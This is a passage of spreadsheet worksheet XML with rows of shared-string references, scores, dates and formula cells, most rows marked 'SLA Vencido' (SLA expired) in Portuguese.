      <c r="J103" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K103" s="4"/>
      <c r="L103" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M103" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N103" s="5">
        <v>4.4000000000000004</v>
      </c>
      <c r="O103" s="14" t="s">
        <v>2507</v>
      </c>
      <c r="P103" s="6"/>
      <c r="Q103" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R103" s="4"/>
      <c r="S103" s="22"/>
      <c r="T103" s="8">
        <v>45615</v>
      </c>
      <c r="U103" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V103" s="8">
        <f t="shared" si="4"/>
        <v>45705</v>
      </c>
      <c r="W103" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X103" s="11"/>
      <c r="Y103" s="11"/>
      <c r="Z103" s="11"/>
      <c r="AA103" s="8"/>
      <c r="AB103" s="9" t="s">
        <v>2508</v>
      </c>
      <c r="AC103" s="9" t="s">
        <v>1713</v>
      </c>
      <c r="AD103" s="32" t="s">
        <v>2509</v>
      </c>
      <c r="AE103" s="70" t="s">
        <v>2492</v>
      </c>
      <c r="AF103" s="9"/>
      <c r="AG103" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="104" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A104" s="5">
        <v>103</v>
      </c>
      <c r="B104" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C104" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D104" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E104" s="4"/>
      <c r="F104" s="4"/>
      <c r="G104" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H104" s="9" t="s">
        <v>2512</v>
      </c>
      <c r="I104" s="6" t="s">
        <v>2513</v>
      </c>
      <c r="J104" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K104" s="4"/>
      <c r="L104" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M104" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N104" s="5">
        <v>4</v>
      </c>
      <c r="O104" s="6"/>
      <c r="P104" s="6"/>
      <c r="Q104" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R104" s="4"/>
      <c r="S104" s="22"/>
      <c r="T104" s="8">
        <v>45615</v>
      </c>
      <c r="U104" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V104" s="8">
        <f t="shared" si="4"/>
        <v>45705</v>
      </c>
      <c r="W104" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X104" s="11"/>
      <c r="Y104" s="11"/>
      <c r="Z104" s="11"/>
      <c r="AA104" s="8"/>
      <c r="AB104" s="9" t="s">
        <v>1215</v>
      </c>
      <c r="AC104" s="9" t="s">
        <v>2514</v>
      </c>
      <c r="AD104" s="32" t="s">
        <v>1171</v>
      </c>
      <c r="AE104" s="70" t="s">
        <v>2492</v>
      </c>
      <c r="AF104" s="9"/>
      <c r="AG104" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="105" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A105" s="5">
        <v>104</v>
      </c>
      <c r="B105" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C105" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D105" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E105" s="4"/>
      <c r="F105" s="4"/>
      <c r="G105" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H105" s="9" t="s">
        <v>2515</v>
      </c>
      <c r="I105" s="6" t="s">
        <v>2516</v>
      </c>
      <c r="J105" s="4" t="s">
        <v>2517</v>
      </c>
      <c r="K105" s="4"/>
      <c r="L105" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M105" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N105" s="5">
        <v>3.9</v>
      </c>
      <c r="O105" s="6"/>
      <c r="P105" s="6"/>
      <c r="Q105" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R105" s="4"/>
      <c r="S105" s="22"/>
      <c r="T105" s="8">
        <v>45615</v>
      </c>
      <c r="U105" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V105" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W105" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X105" s="11"/>
      <c r="Y105" s="11"/>
      <c r="Z105" s="11"/>
      <c r="AA105" s="8"/>
      <c r="AB105" s="9" t="s">
        <v>2518</v>
      </c>
      <c r="AC105" s="9" t="s">
        <v>2519</v>
      </c>
      <c r="AD105" s="32" t="s">
        <v>2520</v>
      </c>
      <c r="AE105" s="27" t="s">
        <v>2192</v>
      </c>
      <c r="AF105" s="9" t="s">
        <v>2284</v>
      </c>
      <c r="AG105" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="106" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A106" s="5">
        <v>105</v>
      </c>
      <c r="B106" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C106" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D106" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E106" s="4"/>
      <c r="F106" s="4"/>
      <c r="G106" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H106" s="9" t="s">
        <v>2521</v>
      </c>
      <c r="I106" s="6" t="s">
        <v>2522</v>
      </c>
      <c r="J106" s="4" t="s">
        <v>1271</v>
      </c>
      <c r="K106" s="4"/>
      <c r="L106" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M106" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N106" s="5">
        <v>3.8</v>
      </c>
      <c r="O106" s="6"/>
      <c r="P106" s="6"/>
      <c r="Q106" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R106" s="4"/>
      <c r="S106" s="22"/>
      <c r="T106" s="8">
        <v>45615</v>
      </c>
      <c r="U106" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V106" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W106" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X106" s="11"/>
      <c r="Y106" s="11"/>
      <c r="Z106" s="11"/>
      <c r="AA106" s="8"/>
      <c r="AB106" s="9" t="s">
        <v>2523</v>
      </c>
      <c r="AC106" s="9" t="s">
        <v>2524</v>
      </c>
      <c r="AD106" s="32" t="s">
        <v>1274</v>
      </c>
      <c r="AE106" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF106" s="9"/>
      <c r="AG106" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="107" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A107" s="5">
        <v>106</v>
      </c>
      <c r="B107" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C107" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D107" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E107" s="4"/>
      <c r="F107" s="4"/>
      <c r="G107" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H107" s="9" t="s">
        <v>2525</v>
      </c>
      <c r="I107" s="6" t="s">
        <v>2526</v>
      </c>
      <c r="J107" s="4" t="s">
        <v>2527</v>
      </c>
      <c r="K107" s="4"/>
      <c r="L107" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M107" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N107" s="5">
        <v>3.8</v>
      </c>
      <c r="O107" s="6"/>
      <c r="P107" s="6"/>
      <c r="Q107" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R107" s="4"/>
      <c r="S107" s="22"/>
      <c r="T107" s="8">
        <v>45615</v>
      </c>
      <c r="U107" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V107" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W107" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X107" s="11"/>
      <c r="Y107" s="11"/>
      <c r="Z107" s="11"/>
      <c r="AA107" s="8"/>
      <c r="AB107" s="9" t="s">
        <v>2528</v>
      </c>
      <c r="AC107" s="9" t="s">
        <v>2529</v>
      </c>
      <c r="AD107" s="32" t="s">
        <v>2530</v>
      </c>
      <c r="AE107" s="27" t="s">
        <v>2435</v>
      </c>
      <c r="AF107" s="9"/>
      <c r="AG107" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="108" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A108" s="5">
        <v>107</v>
      </c>
      <c r="B108" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C108" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D108" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E108" s="4"/>
      <c r="F108" s="4"/>
      <c r="G108" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H108" s="9" t="s">
        <v>2531</v>
      </c>
      <c r="I108" s="6" t="s">
        <v>2532</v>
      </c>
      <c r="J108" s="4" t="s">
        <v>2527</v>
      </c>
      <c r="K108" s="4"/>
      <c r="L108" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M108" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N108" s="5">
        <v>3.8</v>
      </c>
      <c r="O108" s="6"/>
      <c r="P108" s="6"/>
      <c r="Q108" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R108" s="4"/>
      <c r="S108" s="22"/>
      <c r="T108" s="8">
        <v>45615</v>
      </c>
      <c r="U108" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V108" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W108" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X108" s="11"/>
      <c r="Y108" s="11"/>
      <c r="Z108" s="11"/>
      <c r="AA108" s="8"/>
      <c r="AB108" s="9" t="s">
        <v>2528</v>
      </c>
      <c r="AC108" s="9" t="s">
        <v>2529</v>
      </c>
      <c r="AD108" s="32" t="s">
        <v>2530</v>
      </c>
      <c r="AE108" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF108" s="9"/>
      <c r="AG108" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="109" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A109" s="5">
        <v>108</v>
      </c>
      <c r="B109" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C109" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D109" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E109" s="4"/>
      <c r="F109" s="4"/>
      <c r="G109" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H109" s="9" t="s">
        <v>2533</v>
      </c>
      <c r="I109" s="6" t="s">
        <v>2534</v>
      </c>
      <c r="J109" s="4" t="s">
        <v>1625</v>
      </c>
      <c r="K109" s="4"/>
      <c r="L109" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M109" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N109" s="5">
        <v>3.8</v>
      </c>
      <c r="O109" s="6"/>
      <c r="P109" s="6"/>
      <c r="Q109" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R109" s="4"/>
      <c r="S109" s="22"/>
      <c r="T109" s="8">
        <v>45615</v>
      </c>
      <c r="U109" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V109" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W109" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X109" s="11"/>
      <c r="Y109" s="11"/>
      <c r="Z109" s="11"/>
      <c r="AA109" s="8"/>
      <c r="AB109" s="9" t="s">
        <v>2535</v>
      </c>
      <c r="AC109" s="9" t="s">
        <v>2536</v>
      </c>
      <c r="AD109" s="32" t="s">
        <v>2537</v>
      </c>
      <c r="AE109" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF109" s="9"/>
      <c r="AG109" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="110" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A110" s="5">
        <v>109</v>
      </c>
      <c r="B110" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C110" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D110" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E110" s="4"/>
      <c r="F110" s="4"/>
      <c r="G110" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H110" s="9" t="s">
        <v>2538</v>
      </c>
      <c r="I110" s="6" t="s">
        <v>2539</v>
      </c>
      <c r="J110" s="4" t="s">
        <v>1625</v>
      </c>
      <c r="K110" s="4"/>
      <c r="L110" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M110" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N110" s="5">
        <v>3.8</v>
      </c>
      <c r="O110" s="6"/>
      <c r="P110" s="6"/>
      <c r="Q110" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R110" s="4"/>
      <c r="S110" s="22"/>
      <c r="T110" s="8">
        <v>45615</v>
      </c>
      <c r="U110" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V110" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W110" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X110" s="11"/>
      <c r="Y110" s="11"/>
      <c r="Z110" s="11"/>
      <c r="AA110" s="8"/>
      <c r="AB110" s="9" t="s">
        <v>2535</v>
      </c>
      <c r="AC110" s="9" t="s">
        <v>2536</v>
      </c>
      <c r="AD110" s="32" t="s">
        <v>2537</v>
      </c>
      <c r="AE110" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF110" s="9"/>
      <c r="AG110" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="111" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A111" s="5">
        <v>110</v>
      </c>
      <c r="B111" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C111" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D111" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E111" s="4"/>
      <c r="F111" s="4"/>
      <c r="G111" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H111" s="9" t="s">
        <v>2540</v>
      </c>
      <c r="I111" s="6" t="s">
        <v>2541</v>
      </c>
      <c r="J111" s="4" t="s">
        <v>1635</v>
      </c>
      <c r="K111" s="4"/>
      <c r="L111" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M111" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N111" s="5">
        <v>3.8</v>
      </c>
      <c r="O111" s="6"/>
      <c r="P111" s="6"/>
      <c r="Q111" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R111" s="4"/>
      <c r="S111" s="22"/>
      <c r="T111" s="8">
        <v>45615</v>
      </c>
      <c r="U111" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V111" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W111" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X111" s="11"/>
      <c r="Y111" s="11"/>
      <c r="Z111" s="11"/>
      <c r="AA111" s="8"/>
      <c r="AB111" s="9" t="s">
        <v>2542</v>
      </c>
      <c r="AC111" s="9" t="s">
        <v>2543</v>
      </c>
      <c r="AD111" s="32" t="s">
        <v>2544</v>
      </c>
      <c r="AE111" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF111" s="9"/>
      <c r="AG111" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="112" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A112" s="5">
        <v>111</v>
      </c>
      <c r="B112" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C112" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D112" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E112" s="4"/>
      <c r="F112" s="4"/>
      <c r="G112" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H112" s="9" t="s">
        <v>2545</v>
      </c>
      <c r="I112" s="6" t="s">
        <v>2546</v>
      </c>
      <c r="J112" s="4" t="s">
        <v>1635</v>
      </c>
      <c r="K112" s="4"/>
      <c r="L112" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M112" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N112" s="5">
        <v>3.8</v>
      </c>
      <c r="O112" s="6"/>
      <c r="P112" s="6"/>
      <c r="Q112" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R112" s="4"/>
      <c r="S112" s="22"/>
      <c r="T112" s="8">
        <v>45615</v>
      </c>
      <c r="U112" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V112" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W112" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X112" s="11"/>
      <c r="Y112" s="11"/>
      <c r="Z112" s="11"/>
      <c r="AA112" s="8"/>
      <c r="AB112" s="9" t="s">
        <v>2542</v>
      </c>
      <c r="AC112" s="9" t="s">
        <v>2543</v>
      </c>
      <c r="AD112" s="32" t="s">
        <v>2544</v>
      </c>
      <c r="AE112" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF112" s="9"/>
      <c r="AG112" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="113" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A113" s="5">
        <v>112</v>
      </c>
      <c r="B113" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C113" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D113" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E113" s="4"/>
      <c r="F113" s="4"/>
      <c r="G113" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H113" s="9" t="s">
        <v>2547</v>
      </c>
      <c r="I113" s="6" t="s">
        <v>2548</v>
      </c>
      <c r="J113" s="4" t="s">
        <v>1645</v>
      </c>
      <c r="K113" s="4"/>
      <c r="L113" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M113" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N113" s="5">
        <v>3.8</v>
      </c>
      <c r="O113" s="6"/>
      <c r="P113" s="6"/>
      <c r="Q113" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R113" s="4"/>
      <c r="S113" s="22"/>
      <c r="T113" s="8">
        <v>45615</v>
      </c>
      <c r="U113" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V113" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W113" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X113" s="11"/>
      <c r="Y113" s="11"/>
      <c r="Z113" s="11"/>
      <c r="AA113" s="8"/>
      <c r="AB113" s="9" t="s">
        <v>2549</v>
      </c>
      <c r="AC113" s="9" t="s">
        <v>2550</v>
      </c>
      <c r="AD113" s="32" t="s">
        <v>2551</v>
      </c>
      <c r="AE113" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF113" s="9"/>
      <c r="AG113" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="114" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A114" s="5">
        <v>113</v>
      </c>
      <c r="B114" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C114" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D114" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E114" s="4"/>
      <c r="F114" s="4"/>
      <c r="G114" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H114" s="9" t="s">
        <v>2552</v>
      </c>
      <c r="I114" s="6" t="s">
        <v>2553</v>
      </c>
      <c r="J114" s="4" t="s">
        <v>1645</v>
      </c>
      <c r="K114" s="4"/>
      <c r="L114" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M114" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N114" s="5">
        <v>3.8</v>
      </c>
      <c r="O114" s="6"/>
      <c r="P114" s="6"/>
      <c r="Q114" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R114" s="4"/>
      <c r="S114" s="22"/>
      <c r="T114" s="8">
        <v>45615</v>
      </c>
      <c r="U114" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V114" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W114" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X114" s="11"/>
      <c r="Y114" s="11"/>
      <c r="Z114" s="11"/>
      <c r="AA114" s="8"/>
      <c r="AB114" s="9" t="s">
        <v>2549</v>
      </c>
      <c r="AC114" s="9" t="s">
        <v>2550</v>
      </c>
      <c r="AD114" s="32" t="s">
        <v>2551</v>
      </c>
      <c r="AE114" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF114" s="9"/>
      <c r="AG114" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="115" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A115" s="5">
        <v>114</v>
      </c>
      <c r="B115" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C115" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D115" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E115" s="4"/>
      <c r="F115" s="4"/>
      <c r="G115" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H115" s="9" t="s">
        <v>2554</v>
      </c>
      <c r="I115" s="6" t="s">
        <v>2555</v>
      </c>
      <c r="J115" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K115" s="4"/>
      <c r="L115" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M115" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N115" s="5">
        <v>3.6</v>
      </c>
      <c r="O115" s="6"/>
      <c r="P115" s="6"/>
      <c r="Q115" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R115" s="4"/>
      <c r="S115" s="22"/>
      <c r="T115" s="8">
        <v>45615</v>
      </c>
      <c r="U115" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V115" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W115" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X115" s="11"/>
      <c r="Y115" s="11"/>
      <c r="Z115" s="11"/>
      <c r="AA115" s="8"/>
      <c r="AB115" s="9" t="s">
        <v>2556</v>
      </c>
      <c r="AC115" s="9" t="s">
        <v>2557</v>
      </c>
      <c r="AD115" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE115" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF115" s="9"/>
      <c r="AG115" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="116" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A116" s="5">
        <v>115</v>
      </c>
      <c r="B116" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C116" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D116" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E116" s="4"/>
      <c r="F116" s="4"/>
      <c r="G116" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H116" s="9" t="s">
        <v>2558</v>
      </c>
      <c r="I116" s="6" t="s">
        <v>2559</v>
      </c>
      <c r="J116" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K116" s="4"/>
      <c r="L116" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M116" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N116" s="5">
        <v>2.8</v>
      </c>
      <c r="O116" s="6"/>
      <c r="P116" s="6"/>
      <c r="Q116" s="4" t="s">
        <v>2243</v>
      </c>
      <c r="R116" s="4"/>
      <c r="S116" s="22"/>
      <c r="T116" s="8">
        <v>45615</v>
      </c>
      <c r="U116" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V116" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W116" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X116" s="11"/>
      <c r="Y116" s="11"/>
      <c r="Z116" s="11"/>
      <c r="AA116" s="8"/>
      <c r="AB116" s="9" t="s">
        <v>2560</v>
      </c>
      <c r="AC116" s="9" t="s">
        <v>2561</v>
      </c>
      <c r="AD116" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE116" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF116" s="9"/>
      <c r="AG116" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="117" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A117" s="5">
        <v>116</v>
      </c>
      <c r="B117" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C117" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D117" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E117" s="4"/>
      <c r="F117" s="4"/>
      <c r="G117" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H117" s="9" t="s">
        <v>2562</v>
      </c>
      <c r="I117" s="6" t="s">
        <v>2563</v>
      </c>
      <c r="J117" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K117" s="4"/>
      <c r="L117" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M117" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N117" s="5">
        <v>2.8</v>
      </c>
      <c r="O117" s="6"/>
      <c r="P117" s="6"/>
      <c r="Q117" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R117" s="4"/>
      <c r="S117" s="22"/>
      <c r="T117" s="8">
        <v>45615</v>
      </c>
      <c r="U117" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V117" s="8">
        <f t="shared" si="4"/>
        <v>45735</v>
      </c>
      <c r="W117" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X117" s="11"/>
      <c r="Y117" s="11"/>
      <c r="Z117" s="11"/>
      <c r="AA117" s="8"/>
      <c r="AB117" s="9" t="s">
        <v>2560</v>
      </c>
      <c r="AC117" s="9" t="s">
        <v>2561</v>
      </c>
      <c r="AD117" s="32" t="s">
        <v>1228</v>
      </c>
      <c r="AE117" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF117" s="9"/>
      <c r="AG117" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="118" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A118" s="5">
        <v>117</v>
      </c>
      <c r="B118" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C118" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D118" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E118" s="4"/>
      <c r="F118" s="4"/>
      <c r="G118" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H118" s="9" t="s">
        <v>2564</v>
      </c>
      <c r="I118" s="6" t="s">
        <v>2565</v>
      </c>
      <c r="J118" s="4" t="s">
        <v>1579</v>
      </c>
      <c r="K118" s="4"/>
      <c r="L118" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M118" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N118" s="5">
        <v>3.8</v>
      </c>
      <c r="O118" s="6"/>
      <c r="P118" s="6"/>
      <c r="Q118" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R118" s="4">
        <v>444</v>
      </c>
      <c r="S118" s="22"/>
      <c r="T118" s="8">
        <v>45628</v>
      </c>
      <c r="U118" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V118" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W118" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X118" s="11"/>
      <c r="Y118" s="11"/>
      <c r="Z118" s="11"/>
      <c r="AA118" s="8"/>
      <c r="AB118" s="9" t="s">
        <v>2566</v>
      </c>
      <c r="AC118" s="9" t="s">
        <v>2567</v>
      </c>
      <c r="AD118" s="32" t="s">
        <v>2568</v>
      </c>
      <c r="AE118" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF118" s="9"/>
      <c r="AG118" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="119" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A119" s="5">
        <v>118</v>
      </c>
      <c r="B119" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C119" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D119" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E119" s="4"/>
      <c r="F119" s="4"/>
      <c r="G119" s="6" t="s">
        <v>2096</v>
      </c>
